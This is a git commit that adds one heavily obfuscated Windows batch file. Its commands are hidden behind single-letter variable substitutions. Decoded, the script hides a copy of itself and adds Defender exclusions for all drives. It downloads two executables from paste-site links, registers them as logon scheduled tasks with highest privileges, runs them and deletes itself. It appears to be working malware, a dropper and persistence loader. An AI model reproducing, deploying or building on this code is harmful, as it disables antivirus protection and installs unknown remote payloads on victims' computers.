618126f0e4c6aa89c344f29efb7f0598f7c7d518
alah akokasokas <147284821+muhabibilover@users.noreply.github.com>
2023-12-17 12:57:59 -0800

    Add files via upload

---
+++ truopans.bat
@@ -0,0 +1,147 @@
+@echo off
+goto abc
+:abd
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% idkmuviwmp=a
+goto KOMYTUKBFH
+%gjpiyxevsx%%dkczeajddz%%mpqdfsriaj% yycoegmsxs=a
+:KOMYTUKBFH
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% telqskusln=b
+goto XFJPTGPZZC
+%gjpiyxevsx%%kmnpwusbsx%%exnwzzdqzg% mgjtsswcmp=b
+:XFJPTGPZZC
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% ptokdoeoai=c
+goto RIYPVNQAIZ
+%gjpiyxevsx%%lwyeutuoct%%uxdpckrmjd% onlpyqnigm=c
+:RIYPVNQAIZ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% svjmqmkneg=d
+goto OPLXVQFHSW
+%gjpiyxevsx%%jzcsbvxpwq%%eguglaywoa% mmijmrgbkk=d
+:OPLXVQFHSW
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% ybbwbgesjd=e
+goto YUUVLFBLHT
+%gjpiyxevsx%%blhfoduelm%%ssjetmsnsw% ftedgzsjkg=e
+:YUUVLFBLHT
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% reqwcmftta=f
+goto NCAAARLUWQ
+%gjpiyxevsx%%qpgrkothkj%%msplcsjhmt% cezezcsxjc=f
+:NCAAARLUWQ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% oldecpuadx=g
+goto OJDVFPCBQM
+%gjpiyxevsx%%sratxlagph%%qgzhynyawp% lnqviszinz=g
+:OJDVFPCBQM
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% zqlbsfqesu=h
+goto USEYJKHMKJ
+%gjpiyxevsx%%yxtdiftkue%%chzmwckxvn% spblalhgdw=h
+:USEYJKHMKJ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% nyshhqanhq=i
+goto NABSDRTVKF
+%gjpiyxevsx%%zlmlzfgftz%%rlyysniavk% tzmaykktms=i
+:NABSDRTVKF
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% pfvcmprtbn=j
+goto CARKGBHQTD
+%gjpiyxevsx%%wszsyivmcw%%ayxitearpg% rcqofmntgq=j
+:CARKGBHQTD
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% uowfqjwfvj=k
+goto MJIBPROBYZ
+%gjpiyxevsx%%hxiqpxrqrt%%gdpseyuwtc% cdrsdbzqgn=k
+:MJIBPROBYZ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% nwtykqioug=l
+goto TLTSILXZNX
+%gjpiyxevsx%%vfovdjbzgp%%zhesgevyda% yrumofjlvj=l
+:TLTSILXZNX
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% dwjrobwjee=m
+goto UVEHFKZMXT
+%gjpiyxevsx%%xlrrjhsfbm%%xorzghkfnw% buppbdpkzg=m
+:UVEHFKZMXT
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% nfaixrduia=n
+goto SYIVNMCMRQ
+%gjpiyxevsx%%vkomxjlyfk%%htzxwwgjct% hzhymxjped=n
+:SYIVNMCMRQ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% arphedxlnw=o
+goto KJNHZUACGM
+%gjpiyxevsx%%oskfsqxhfg%%wbgcliqsrq% adwynekqoa=o
+:KJNHZUACGM
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% vrvnnjofhu=p
+goto ZOMTVFYEFJ
+%gjpiyxevsx%%kdfgktxved%%xhjyqghyln% xkjgngzyxx=p
+:ZOMTVFYEFJ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% zeejjedyrp=q
+goto BQGVICFDKH
+%gjpiyxevsx%%umwxtjegiz%%drkbubmkfj% pzwmsphucs=q
+:BQGVICFDKH
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% lffohtpvqn=r
+goto OGENIPKBEC
+%gjpiyxevsx%%bnhnlcnexw%%vyhuoiytef% wxyjshflbq=r
+:OGENIPKBEC
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% akeadenxqk=s
+goto IKSNKWLCOZ
+%gjpiyxevsx%%cxscjbprht%%lzxmrsmood% ydbeygwrvn=s
+:IKSNKWLCOZ
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% jwdkfvfpkg=t
+goto FQFVJZAKXW
+%gjpiyxevsx%%aawqqesrbq%%vioeajtzta% dnchbabdqj=t
+:FQFVJZAKXW
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% pcvuppzuod=u
+goto PVOSAOWNMT
+%gjpiyxevsx%%smbddlpgqm%%cjzutccxix% wuzbvhnlpg=u
+:PVOSAOWNMT
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% igkurvavya=v
+goto EEUYPAGXBP
+%gjpiyxevsx%%hqapzwojpj%%dtkjrbekst% tftbolnaoc=v
+:EEUYPAGXBP
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% gnxbrypcix=w
+goto FKXTUYXDVM
+%gjpiyxevsx%%jsurmuuiug%%bwoxydikmr% wegkiiisda=w
+:FKXTUYXDVM
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% qrfzhnlgxu=x
+goto LTYWXTCPPI
+%gjpiyxevsx%%qynbxoonzd%%titjllfzbm% jqvjpuciiw=x
+:LTYWXTCPPI
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% eamewzvqmq=y
+goto XQQHDHCEZH
+%gjpiyxevsx%%qmgjnobhyz%%imsvhwdcak% dpbpyatdcu=y
+:XQQHDHCEZH
+%vpfbbjmmdd%%mrhagrqaje%%zvlsmeadqp% ggpabxmwgn=z
+goto TBLIVKCTZD
+%gjpiyxevsx%%nttqnqqoiv%%rzrginvuuf% idkmuviwmp=z
+:TBLIVKCTZD
+@echo on
+@%ybbwbgesjd%%ptokdoeoai%%zqlbsfqesu%%arphedxlnw% %arphedxlnw%%reqwcmftta%%reqwcmftta%
+%akeadenxqk%%ybbwbgesjd%%jwdkfvfpkg% "%ybbwbgesjd%%nwtykqioug%%ptokdoeoai%=%USERPROFILE%"
+%akeadenxqk%%ybbwbgesjd%%jwdkfvfpkg% "%nwtykqioug%%arphedxlnw%%ptokdoeoai%=%SYSTEMROOT%\S%eamewzvqmq%%akeadenxqk%%jwdkfvfpkg%%ybbwbgesjd%%dwjrobwjee%32\$77_DRIVERS"
+%nyshhqanhq%%reqwcmftta% %nfaixrduia%%arphedxlnw%%jwdkfvfpkg% %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%akeadenxqk%%jwdkfvfpkg% "%LOC%" ( %dwjrobwjee%%uowfqjwfvj%%svjmqmkneg%%nyshhqanhq%%lffohtpvqn% "%LOC%" )
+
+%nyshhqanhq%%reqwcmftta% %nfaixrduia%%arphedxlnw%%jwdkfvfpkg% "%~F0"=="%TEMP%\%telqskusln%%arphedxlnw%%dwjrobwjee%%telqskusln%%arphedxlnw%%ptokdoeoai%%nwtykqioug%%idkmuviwmp%%jwdkfvfpkg%%akeadenxqk%%vrvnnjofhu%%arphedxlnw%%arphedxlnw%%reqwcmftta%%oldecpuadx%%svjmqmkneg%%akeadenxqk%%oldecpuadx%%arphedxlnw%%oldecpuadx%%ybbwbgesjd%%akeadenxqk%%zqlbsfqesu%%svjmqmkneg%%akeadenxqk%.%telqskusln%%idkmuviwmp%%jwdkfvfpkg%" (
+    %ptokdoeoai%%arphedxlnw%%vrvnnjofhu%%eamewzvqmq% "%~F0" "%TEMP%\%telqskusln%%arphedxlnw%%dwjrobwjee%%telqskusln%%arphedxlnw%%ptokdoeoai%%nwtykqioug%%idkmuviwmp%%jwdkfvfpkg%%akeadenxqk%%vrvnnjofhu%%arphedxlnw%%arphedxlnw%%reqwcmftta%%oldecpuadx%%svjmqmkneg%%akeadenxqk%%oldecpuadx%%arphedxlnw%%oldecpuadx%%ybbwbgesjd%%akeadenxqk%%zqlbsfqesu%%svjmqmkneg%%akeadenxqk%.%telqskusln%%idkmuviwmp%%jwdkfvfpkg%"
+    %idkmuviwmp%%jwdkfvfpkg%%jwdkfvfpkg%%lffohtpvqn%%nyshhqanhq%%telqskusln% +%akeadenxqk% +%zqlbsfqesu% "%TEMP%\%telqskusln%%arphedxlnw%%dwjrobwjee%%telqskusln%%arphedxlnw%%ptokdoeoai%%nwtykqioug%%idkmuviwmp%%jwdkfvfpkg%%akeadenxqk%%vrvnnjofhu%%arphedxlnw%%arphedxlnw%%reqwcmftta%%oldecpuadx%%svjmqmkneg%%akeadenxqk%%oldecpuadx%%arphedxlnw%%oldecpuadx%%ybbwbgesjd%%akeadenxqk%%zqlbsfqesu%%svjmqmkneg%%akeadenxqk%.%telqskusln%%idkmuviwmp%%jwdkfvfpkg%"
+    %vrvnnjofhu%%arphedxlnw%%gnxbrypcix%%ybbwbgesjd%%lffohtpvqn%%akeadenxqk%%zqlbsfqesu%%ybbwbgesjd%%nwtykqioug%%nwtykqioug% -%gnxbrypcix%%nyshhqanhq%%nfaixrduia%%svjmqmkneg%%arphedxlnw%%gnxbrypcix%%akeadenxqk%%jwdkfvfpkg%%eamewzvqmq%%nwtykqioug%%ybbwbgesjd% %zqlbsfqesu%%nyshhqanhq%%svjmqmkneg%%svjmqmkneg%%ybbwbgesjd%%nfaixrduia% "%TEMP%\%telqskusln%%arphedxlnw%%dwjrobwjee%%telqskusln%%arphedxlnw%%ptokdoeoai%%nwtykqioug%%idkmuviwmp%%jwdkfvfpkg%%akeadenxqk%%vrvnnjofhu%%arphedxlnw%%arphedxlnw%%reqwcmftta%%oldecpuadx%%svjmqmkneg%%akeadenxqk%%oldecpuadx%%arphedxlnw%%oldecpuadx%%ybbwbgesjd%%akeadenxqk%%zqlbsfqesu%%svjmqmkneg%%akeadenxqk%.%telqskusln%%idkmuviwmp%%jwdkfvfpkg%"
+    %svjmqmkneg%%ybbwbgesjd%%nwtykqioug% "%~F0" & %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%jwdkfvfpkg%
+)
+%reqwcmftta%%arphedxlnw%%lffohtpvqn% /%reqwcmftta% %%A %nyshhqanhq%%nfaixrduia% ('%dwjrobwjee%%arphedxlnw%%pcvuppzuod%%nfaixrduia%%jwdkfvfpkg%%igkurvavya%%arphedxlnw%%nwtykqioug% ^| %reqwcmftta%%nyshhqanhq%%nfaixrduia%%svjmqmkneg% ":\"') %svjmqmkneg%%arphedxlnw% (>%nfaixrduia%%pcvuppzuod%%nwtykqioug% %vrvnnjofhu%%arphedxlnw%%gnxbrypcix%%ybbwbgesjd%%lffohtpvqn%%akeadenxqk%%zqlbsfqesu%%ybbwbgesjd%%nwtykqioug%%nwtykqioug% -%ptokdoeoai% %idkmuviwmp%%svjmqmkneg%%svjmqmkneg%-%dwjrobwjee%%vrvnnjofhu%%vrvnnjofhu%%lffohtpvqn%%ybbwbgesjd%%reqwcmftta%%ybbwbgesjd%%lffohtpvqn%%ybbwbgesjd%%nfaixrduia%%ptokdoeoai%%ybbwbgesjd% -%ybbwbgesjd%%qrfzhnlgxu%%ptokdoeoai%%nwtykqioug%%pcvuppzuod%%akeadenxqk%%nyshhqanhq%%arphedxlnw%%nfaixrduia%%vrvnnjofhu%%idkmuviwmp%%jwdkfvfpkg%%zqlbsfqesu% %%A)
+%nyshhqanhq%%reqwcmftta% %nfaixrduia%%arphedxlnw%%jwdkfvfpkg% %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%akeadenxqk%%jwdkfvfpkg% "%USERPROFILE%\%pcvuppzuod%%akeadenxqk%%ybbwbgesjd%%lffohtpvqn%%vrvnnjofhu%%reqwcmftta%%nwtykqioug%" (
+    %ybbwbgesjd%%ptokdoeoai%%zqlbsfqesu%%arphedxlnw% L >"%USERPROFILE%\%pcvuppzuod%%akeadenxqk%%ybbwbgesjd%%lffohtpvqn%%vrvnnjofhu%%reqwcmftta%%nwtykqioug%" 
+    %idkmuviwmp%%jwdkfvfpkg%%jwdkfvfpkg%%lffohtpvqn%%nyshhqanhq%%telqskusln% +%akeadenxqk% +%zqlbsfqesu% "%USERPROFILE%\%pcvuppzuod%%akeadenxqk%%ybbwbgesjd%%lffohtpvqn%%vrvnnjofhu%%reqwcmftta%%nwtykqioug%" 
+) %ybbwbgesjd%%nwtykqioug%%akeadenxqk%%ybbwbgesjd% ( 
+    %svjmqmkneg%%ybbwbgesjd%%nwtykqioug% /%zeejjedyrp% "%~F0" 
+    %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%jwdkfvfpkg% 
+)
+
+%reqwcmftta%%arphedxlnw%%lffohtpvqn% /%reqwcmftta% %%A %nyshhqanhq%%nfaixrduia% ('%ptokdoeoai%%pcvuppzuod%%lffohtpvqn%%nwtykqioug% -L --S%nyshhqanhq%%nwtykqioug%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg% "%lffohtpvqn%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg%%lffohtpvqn%%eamewzvqmq%.%ptokdoeoai%%arphedxlnw%/%reqwcmftta%%vrvnnjofhu%%pcvuppzuod%2/%lffohtpvqn%%idkmuviwmp%%gnxbrypcix%"') %svjmqmkneg%%arphedxlnw% %akeadenxqk%%ybbwbgesjd%%jwdkfvfpkg% "%nwtykqioug%%uowfqjwfvj%1=%%A"
+%reqwcmftta%%arphedxlnw%%lffohtpvqn% /%reqwcmftta% %%A %nyshhqanhq%%nfaixrduia% ('%ptokdoeoai%%pcvuppzuod%%lffohtpvqn%%nwtykqioug% -L --S%nyshhqanhq%%nwtykqioug%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg% "%lffohtpvqn%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg%%lffohtpvqn%%eamewzvqmq%.%ptokdoeoai%%arphedxlnw%/%reqwcmftta%%vrvnnjofhu%%pcvuppzuod%3/%lffohtpvqn%%idkmuviwmp%%gnxbrypcix%"') %svjmqmkneg%%arphedxlnw% %akeadenxqk%%ybbwbgesjd%%jwdkfvfpkg% "%nwtykqioug%%uowfqjwfvj%2=%%A"
+
+%nyshhqanhq%%reqwcmftta% %nfaixrduia%%arphedxlnw%%jwdkfvfpkg% %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%akeadenxqk%%jwdkfvfpkg% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%1.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%" ( %ptokdoeoai%%pcvuppzuod%%lffohtpvqn%%nwtykqioug% -L --S%nyshhqanhq%%nwtykqioug%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg% "%LK1%" -%arphedxlnw% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%1.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%")
+%nyshhqanhq%%reqwcmftta% %nfaixrduia%%arphedxlnw%%jwdkfvfpkg% %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%akeadenxqk%%jwdkfvfpkg% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%2.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%" ( %ptokdoeoai%%pcvuppzuod%%lffohtpvqn%%nwtykqioug% -L --S%nyshhqanhq%%nwtykqioug%%ybbwbgesjd%%nfaixrduia%%jwdkfvfpkg% "%LK2%" -%arphedxlnw% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%2.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%")
+
+>%nfaixrduia%%pcvuppzuod%%nwtykqioug% %akeadenxqk%%ptokdoeoai%%zqlbsfqesu%%jwdkfvfpkg%%idkmuviwmp%%akeadenxqk%%uowfqjwfvj%%akeadenxqk% /%ptokdoeoai%%lffohtpvqn%%ybbwbgesjd%%idkmuviwmp%%jwdkfvfpkg%%ybbwbgesjd% /%jwdkfvfpkg%%nfaixrduia% "$77-RK" /%jwdkfvfpkg%%lffohtpvqn% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%1.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%" /%akeadenxqk%%ptokdoeoai% "%arphedxlnw%%nfaixrduia%%nwtykqioug%%arphedxlnw%%oldecpuadx%%arphedxlnw%%nfaixrduia%" /%lffohtpvqn%%nwtykqioug% "%zqlbsfqesu%%nyshhqanhq%%oldecpuadx%%zqlbsfqesu%%ybbwbgesjd%%akeadenxqk%%jwdkfvfpkg%" /%reqwcmftta%
+>%nfaixrduia%%pcvuppzuod%%nwtykqioug% %akeadenxqk%%ptokdoeoai%%zqlbsfqesu%%jwdkfvfpkg%%idkmuviwmp%%akeadenxqk%%uowfqjwfvj%%akeadenxqk% /%ptokdoeoai%%lffohtpvqn%%ybbwbgesjd%%idkmuviwmp%%jwdkfvfpkg%%ybbwbgesjd% /%jwdkfvfpkg%%nfaixrduia% "$77-1A" /%jwdkfvfpkg%%lffohtpvqn% "%LOC%\$77-%vrvnnjofhu%%nwtykqioug%2.%ybbwbgesjd%%qrfzhnlgxu%%ybbwbgesjd%" /%akeadenxqk%%ptokdoeoai% "%arphedxlnw%%nfaixrduia%%nwtykqioug%%arphedxlnw%%oldecpuadx%%arphedxlnw%%nfaixrduia%" /%lffohtpvqn%%nwtykqioug% "%zqlbsfqesu%%nyshhqanhq%%oldecpuadx%%zqlbsfqesu%%ybbwbgesjd%%akeadenxqk%%jwdkfvfpkg%" /%reqwcmftta%
+
+>%nfaixrduia%%pcvuppzuod%%nwtykqioug% %akeadenxqk%%ptokdoeoai%%zqlbsfqesu%%jwdkfvfpkg%%idkmuviwmp%%akeadenxqk%%uowfqjwfvj%%akeadenxqk% /%lffohtpvqn%%pcvuppzuod%%nfaixrduia% /%jwdkfvfpkg%%nfaixrduia% "$77-1A"
+>%nfaixrduia%%pcvuppzuod%%nwtykqioug% %akeadenxqk%%ptokdoeoai%%zqlbsfqesu%%jwdkfvfpkg%%idkmuviwmp%%akeadenxqk%%uowfqjwfvj%%akeadenxqk% /%lffohtpvqn%%pcvuppzuod%%nfaixrduia% /%jwdkfvfpkg%%nfaixrduia% "$77-RK"
+
+%svjmqmkneg%%ybbwbgesjd%%nwtykqioug% "%~F0" & %ybbwbgesjd%%qrfzhnlgxu%%nyshhqanhq%%jwdkfvfpkg%
+
+:abc
+set vpfbbjmmdd=s
+%vpfbbjmmdd%et mrhagrqaje=e
+%vpfbbjmmdd%%mrhagrqaje%t zvlsmeadqp=t
+goto abd
